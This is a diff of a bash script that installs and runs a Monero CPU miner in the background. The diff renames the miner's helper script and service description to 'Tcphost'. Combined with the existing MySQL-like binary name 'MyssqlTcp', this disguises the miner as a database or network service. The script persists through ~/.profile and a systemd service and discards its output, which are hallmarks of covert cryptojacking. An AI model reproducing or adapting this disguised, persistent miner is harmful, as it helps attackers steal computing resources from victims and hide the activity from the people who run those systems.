@@ -116,7 +116,7 @@ fi
 
 # printing intentions
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/myssqltcp/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/myssqltcp/Tcphost.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at  site)"
@@ -737,8 +737,8 @@ cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json
 
 # preparing script
-echo "[*] Creating $HOME/myssqltcp/miner.sh script"
-cat >$HOME/myssqltcp/miner.sh <<EOL
+echo "[*] Creating $HOME/myssqltcp/Tcphost.sh script"
+cat >$HOME/myssqltcp/Tcphost.sh <<EOL
 #!/bin/bash
 if ! pidof MyssqlTcp >/dev/null; then
   nice $HOME/myssqltcp/MyssqlTcp \$*
@@ -749,18 +749,18 @@ fi
 EOL
 
 
-chmod +x $HOME/myssqltcp/miner.sh
+chmod +x $HOME/myssqltcp/Tcphost.sh
 
 # preparing script background work and work under reboot
 if ! sudo -n true 2>/dev/null; then
-  if ! grep myssqltcp/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/myssqltcp/miner.sh script to $HOME/.profile"
-    echo "$HOME/myssqltcp/miner.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep myssqltcp/Tcphost.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/myssqltcp/Tcphost.sh script to $HOME/.profile"
+    echo "$HOME/myssqltcp/Tcphost.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/myssqltcp/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/myssqltcp/Tcphost.sh script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background see logs in $HOME/tmp/server.log file"
-  /bin/bash $HOME/myssqltcp/miner.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
+  /bin/bash $HOME/myssqltcp/Tcphost.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
@@ -772,7 +772,7 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background see logs in $HOME/tmp/server.log file"
-    /bin/bash $HOME/myssqltcp/miner.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
+    /bin/bash $HOME/myssqltcp/Tcphost.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -781,7 +781,7 @@ else
     echo "[*] Creating Myssqltcp systemd service"
     cat >/tmp/MyssqlTcp.service <<EOL
 [Unit]
-Description=Monero miner service
+Description=Monero Tcphost service
 
 [Service]
 ExecStart=$HOME/myssqltcp/MyssqlTcp --config=$HOME/myssqltcp/config.json
